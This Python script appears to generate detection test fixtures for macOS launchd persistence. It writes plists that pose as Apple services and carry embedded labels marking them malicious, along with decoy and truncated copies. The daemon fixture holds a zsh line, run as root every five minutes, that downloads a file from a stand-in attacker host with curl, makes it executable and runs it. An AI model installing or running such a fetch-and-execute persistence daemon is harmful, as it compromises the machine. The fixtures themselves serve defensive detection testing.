"""launchd-plist-route fixtures: stdlib plistlib WRITER only (no lib code). Run: python3 -I plist_launchd_gen.py <dir>"""
import base64, json, plistlib, sys, os

D = sys.argv[1] if len(sys.argv) > 1 else os.path.dirname(os.path.abspath(__file__))
PLAN_A = ("v=3|language=applescript|role=persistence|verdict=malicious|attack=T1543.001|campaign_id=OSA-7c1e9a20|"
          "url=https://osa-7c1e9a20.example.invalid/agent|file_path=/Users/Shared/.7c1e9a20/agent.scpt")
PLAN_B = ("v=3|language=zsh|role=persistence|verdict=malicious|attack=T1543.004|campaign_id=LD-3f0b55e1|"
          "url=https://ld-3f0b55e1.example.invalid/stage|file_path=/Library/Application Support/.3f0b55e1/d")
b64a = base64.b64encode(PLAN_A.encode()).decode()
chunks = [b64a[i:i + 40] for i in range(0, len(b64a), 40)]
osa = ["/usr/bin/osascript", "-e", "-- HUNTRESS_ANALYSIS_V1:SPLIT",
       "-e", "set parts to {" + ", ".join('"%s%s"' % ("B64-" if i == 0 else "", c) for i, c in enumerate(chunks)) + "}",
       "-e", "set AppleScript's text item delimiters to \"\"", "-e", "set plan to parts as text",
       "-e", "do shell script \"echo \" & quoted form of plan & \" > /dev/null\""]
agent = {"Label": "com.apple.audio.helper", "ProgramArguments": osa, "RunAtLoad": True, "KeepAlive": True}
open(os.path.join(D, "plist_launchd_xml_osascript.plist"), "wb").write(plistlib.dumps(agent, fmt=plistlib.FMT_XML))
body = ("# résumé ✓ sync helper\n# HUNTRESS_ANALYSIS_V1:B64-" + base64.b64encode(PLAN_B.encode()).decode() +
        "\ncurl -fsSL \"https://ld-3f0b55e1.example.invalid/stage\" -o /tmp/.d && chmod +x /tmp/.d && /tmp/.d\n")
daemon = {"Label": "com.apple.mdworker.sync", "ProgramArguments": ["/bin/zsh", "-c", body], "UserName": "root",
          "RunAtLoad": True, "StartInterval": 300}
binb = plistlib.dumps(daemon, fmt=plistlib.FMT_BINARY)
info = plistlib.dumps({"CFBundleIdentifier": "com.example.notes", "CFBundleName": "Notes", "CFBundleVersion": "1.0",
                       "LSMinimumSystemVersion": "10.15"}, fmt=plistlib.FMT_BINARY)
open(os.path.join(D, "plist_launchd_bin_daemon.b64"), "w").write(base64.b64encode(binb).decode())
open(os.path.join(D, "plist_launchd_decoy_info_bin.b64"), "w").write(base64.b64encode(info).decode())
open(os.path.join(D, "plist_launchd_decoy_trunc_bin.b64"), "w").write(base64.b64encode(binb[:len(binb) // 2]).decode())
